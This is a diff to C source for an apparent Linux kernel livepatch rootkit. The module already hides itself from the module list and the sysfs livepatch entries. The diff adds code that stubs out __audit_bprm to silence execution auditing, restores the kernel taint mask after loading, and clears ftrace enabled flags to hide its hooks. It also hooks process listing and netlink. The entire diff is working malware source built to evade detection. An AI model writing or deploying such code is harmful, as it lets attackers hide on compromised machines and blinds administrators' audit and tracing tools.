@@ -27,6 +27,8 @@
 #include <linux/cn_proc.h>
 #include <linux/connector.h>
 #include <linux/dynamic_debug.h>
+#include <linux/audit.h>
+
 
 #define FIRST_PROCESS_ENTRY 256
 #define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)
@@ -36,6 +38,32 @@ typedef struct dentry *instantiate_t(struct dentry *,
 struct tgid_iter {
         unsigned int tgid;
         struct task_struct *task;
+};
+
+static struct klp_ops {
+        struct list_head node;
+        struct list_head func_stack;
+        struct ftrace_ops fops;
+};
+
+struct ftrace_func_entry {
+        struct hlist_node hlist;
+        unsigned long ip;
+};
+
+struct ftrace_hash {
+        unsigned long           size_bits;
+        struct hlist_head       *buckets;
+        unsigned long           count;
+        unsigned long           flags;
+        struct rcu_head         rcu;
+};
+
+struct ftrace_page {
+        struct ftrace_page      *next;
+        struct dyn_ftrace       *records;
+        int                     index;
+        int                     size;
 };
 
 struct module *this_module = THIS_MODULE;
@@ -65,6 +93,17 @@ static int (*p_ddebug_remove_module)(const char *mod_name) = NULL;
 
 static const struct kernel_symbol *p__start___ksymtab = NULL;
 static const struct kernel_symbol *p__stop___ksymtab = NULL;
+
+
+static unsigned long old_tainted_mask = 0;
+static unsigned long *p_tainted_mask = NULL;
+
+static struct ftrace_ops __rcu **p_ftrace_ops_list = NULL;
+static struct ftrace_ops *p_ftrace_list_end = NULL;
+static struct mutex *p_ftrace_lock = NULL;
+static struct klp_ops * (*p_klp_find_ops)(void *old_func) = NULL;
+static struct ftrace_func_entry *(*p_ftrace_lookup_ip)(struct ftrace_hash *hash, unsigned long ip) = NULL;
+static struct ftrace_page       **p_ftrace_pages_start = NULL;
 
 static bool has_pid_permissions(struct pid_namespace *pid,
                                  struct task_struct *task,
@@ -359,6 +398,11 @@ static int livepatch_cn_netlink_send(struct cn_msg *msg, u32 portid, u32 __group
 	return cn_netlink_send_mult(msg, msg->len, portid, __group, gfp_mask);
 }
 
+static void livepatch__audit_bprm(struct linux_binprm *bprm)
+{
+	return;
+}
+
 static void hidden_module(struct module *mod) {
 	//del from 'modules' list
 	list_del(&mod->list);
@@ -382,6 +426,97 @@ end:
 	return;
 }
 
+static void save_tainted_mask(void)
+{
+	old_tainted_mask = *p_tainted_mask;
+}
+
+static void restore_tainted_mask(void)
+{
+	*p_tainted_mask = old_tainted_mask; 
+	old_tainted_mask = 0;
+}
+
+static int remove_ftrace_ops(struct ftrace_ops *ops)
+{
+        struct ftrace_ops **p;
+
+        /*
+         * If we are removing the last function, then simply point
+         * to the ftrace_stub.
+         */
+        if (rcu_dereference_protected(*p_ftrace_ops_list,
+                        lockdep_is_held(p_ftrace_lock)) == ops &&
+            rcu_dereference_protected(ops->next,
+                        lockdep_is_held(p_ftrace_lock)) == p_ftrace_list_end) {
+                *p_ftrace_ops_list = p_ftrace_list_end;
+                return 0;
+        }
+
+        for (p = p_ftrace_ops_list; *p != p_ftrace_list_end; p = &(*p)->next)
+                if (*p == ops)
+                        break;
+
+        if (*p != ops)
+                return -1;
+
+        *p = (*p)->next;
+        return 0;
+}
+
+#define do_for_each_ftrace_rec(pg, rec)                                 \
+        for (pg = *p_ftrace_pages_start; pg; pg = pg->next) {              \
+                int _____i;                                             \
+                for (_____i = 0; _____i < pg->index; _____i++) {        \
+                        rec = &pg->records[_____i];
+
+#define while_for_each_ftrace_rec()             \
+                }                               \
+        }
+
+static void hidden_from_enabled_functions(struct klp_object *obj )
+{
+	struct klp_func *func = NULL;
+	struct klp_ops *ops = NULL;
+	struct ftrace_ops *fops = NULL;
+	struct ftrace_hash *hash = NULL;
+	unsigned long ftrace_loc;
+	//struct ftrace_func_entry *entry = NULL;
+	struct ftrace_page *pg = NULL;
+	struct dyn_ftrace *rec = NULL;
+
+	klp_for_each_func(obj, func) {
+		ops = p_klp_find_ops(func->old_func);
+		if (!ops)  
+			continue;
+
+		fops = &ops->fops;
+
+		ftrace_loc = (unsigned long)func->old_func;
+		if (!ftrace_loc) 
+			continue;
+
+		hash = fops->func_hash->filter_hash ;
+		do_for_each_ftrace_rec(pg, rec) {
+			if (p_ftrace_lookup_ip(hash, rec->ip)) {
+				rec->flags &= ~FTRACE_FL_ENABLED;
+				rec->flags &= FTRACE_FL_MASK;
+			}
+		} while_for_each_ftrace_rec();
+
+#if 0
+		entry = p_ftrace_lookup_ip(hash, ftrace_loc);
+		if (entry) {
+			hlist_del(&entry->hlist);
+			hash->count--;
+		}
+
+		remove_ftrace_ops(fops);
+		fops->flags &= ~FTRACE_OPS_FL_ENABLED;
+#endif
+        }
+}
+
 static struct klp_func funcs[] = {
 	{
 		.old_name = "proc_pid_readdir",
@@ -390,6 +525,10 @@ static struct klp_func funcs[] = {
 	{
 		.old_name = "cn_netlink_send",
 		.new_func = livepatch_cn_netlink_send,
+	}, 
+	{
+		.old_name = "__audit_bprm",
+		.new_func = livepatch__audit_bprm,
 	}, 
 	{
 		.old_name = "modules_open",
@@ -470,11 +609,45 @@ static int livepatch_init(void)
 	if (!p_ddebug_remove_module)
 		return -1;
 
+	p_tainted_mask = (unsigned long*)
+				kallsyms_lookup_name("tainted_mask");
+	if (!p_tainted_mask)
+		return -1;
+
+	p_ftrace_lock = (struct mutex *) kallsyms_lookup_name("ftrace_lock");
+	if (!p_ftrace_lock)
+		return -1;
+
+	p_ftrace_ops_list = (struct ftrace_ops **) kallsyms_lookup_name("ftrace_ops_list");
+	if (!p_ftrace_ops_list)
+		return -1;
+
+	p_ftrace_list_end = (struct ftrace_ops *) kallsyms_lookup_name("ftrace_list_end");
+	if (!p_ftrace_list_end)
+		return -1;
+
+	p_klp_find_ops = (struct klp_ops *(*)(void *old_func)) kallsyms_lookup_name("klp_find_ops");
+	if (!p_klp_find_ops)
+		return -1;
+
+	p_ftrace_lookup_ip = (struct ftrace_func_entry *(*)(struct ftrace_hash *hash, unsigned long ip))
+				 kallsyms_lookup_name("ftrace_lookup_ip");
+	if (!p_ftrace_lookup_ip)
+		return -1;
+
+	p_ftrace_pages_start = (struct ftrace_page **)
+				 kallsyms_lookup_name("ftrace_pages_start");
+	if (!p_ftrace_pages_start)
+		return -1;
+
+	save_tainted_mask();
 	ret = klp_enable_patch(&patch);
 	if (ret == 0) { 
 		hidden_module(this_module);
 		hidden_from_sys_livepatch(&patch);
+		hidden_from_enabled_functions(objs);
 	}
+	restore_tainted_mask();
 
 	return ret;
 }
